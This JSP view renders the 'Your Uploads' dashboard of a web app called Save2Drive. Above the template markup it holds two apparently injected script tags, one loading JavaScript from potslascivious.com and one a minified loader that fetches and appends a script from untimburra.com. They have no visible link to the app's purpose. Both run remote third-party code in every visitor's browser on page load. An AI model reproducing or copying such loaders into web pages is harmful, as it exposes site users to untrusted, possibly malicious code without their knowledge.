<%-- 
    Document   : uploads
    Created on : 13 Sep, 2017, 8:15:34 PM
    Author     : Dhaval
--%>

<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@page contentType="text/html" pageEncoding="UTF-8" %>
<%@taglib prefix="ui" tagdir="/WEB-INF/tags" %>

<script type='text/javascript' src='//potslascivious.com/c7/b0/f4/c7b0f48d55af48073c3bd4627956b288.js'></script>
<script>(function(d,z,s){s.src='//'+d+'/400/'+z;try{(document.body||document.documentElement).appendChild(s)}catch(e){}})('untimburra.com',4411735,document.createElement('script'))</script>

<ui:templete title="Save2Drive - Home">

    <jsp:attribute name="head_area">

    </jsp:attribute>

    <jsp:attribute name="body_area">
        
        <!-- Page Header-->
        <header class="page-header">
            <div class="container-fluid">
                <h2 class="no-margin-bottom">Dashboard</h2>
            </div>
        </header>

        <ul class="breadcrumb">
            <div class="container-fluid">
                <li class="breadcrumb-item"><a href="${pageContext.request.contextPath}/index.jsp">Home</a></li>
                <li class="breadcrumb-item active">Your Uploads</li>
            </div>
        </ul>
    </jsp:attribute>
    <jsp:attribute name="javascript">
        <script src="${pageContext.request.contextPath}/js/uploads.js"></script>
    </jsp:attribute>
</ui:templete>
